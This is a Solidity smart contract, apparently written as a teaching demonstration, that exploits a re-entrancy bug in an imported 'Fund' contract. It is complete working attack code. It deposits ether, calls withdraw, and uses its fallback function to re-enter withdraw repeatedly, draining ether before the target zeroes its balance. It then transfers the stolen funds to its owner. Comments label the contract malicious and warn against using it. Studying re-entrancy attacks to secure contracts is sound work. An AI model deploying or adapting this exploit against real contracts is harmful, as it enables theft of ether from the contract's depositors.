pragma solidity ^0.4.20;

import "browser/ContractForReentry.sol";

// THIS CONTRACT CONTAINS A BUG - DO NOT USE
/*
 * @title LetsAttack
 * @author  Luke Riley (https://www.linkedin.com/in/luke-riley-36484221/)
 * @notice The purpose of this smart contract is to show how a contract can be exploit a re-entrancy bug in another contract
 * WARNING: Do NOT use this contract as it is malicious
 */
contract LetsAttack {
    
    //@param target - the Instantiated contract to exploit
    Fund target;
    //@param targetAddress - the address of the contract to exploit
    address targetAddress;
    //@param owner - the creator of the contract, who the 'stolen' ether will be given to
    address public owner;
       event EthChange(string message, uint userEth);
  /*
  * @notice Instantiates this contract, connecting it to the contract that will be exploited
  * and setting the owner
  */
   constructor (address targetContract) public payable {
       
       target = Fund(targetContract);
       targetAddress = targetContract;
       owner = msg.sender;
       
   }
    
  /*
  * @notice This contract needs to deposit some ether into the target contract first before
  * it can make a withdrawal
  */
    function DepositEth() public payable {
        require(targetAddress.call.value(msg.value)(bytes4(keccak256("deposit()"))) == true);
    }
    
  /*
  * @notice This contract should call the withdraw function of the target contract
  */
    function WithdrawEth() public payable {

        target.withdraw();
    }

  /*
  * @notice As the target contract sends ether using the low level call invocation,
  * we have enough gas to perform the re-entrancy attack in the fallback function
  * @param msg.value - The ether the user wants to give to this contract
  */
  function () public payable {
    
        EthChange("The malicious contract has been sent eth", msg.value);
        //recall the withdraw function of the target contract to re-enter and withdraw
        //more ether before this contract's balance is set to zero
        target.withdraw();
  }
  
  /*
  * @notice A getter function that allows the user to check how much ether the contract has
  */ 
  function checkEth() public view returns(uint) {
      
      return address(this).balance;
      
  }
  
  /*
  * @notice Use this function to give the stolen ether to the contract owner
  */ 
  function giveEthToOwner() public {
      
      owner.transfer(address(this).balance);
  }

}


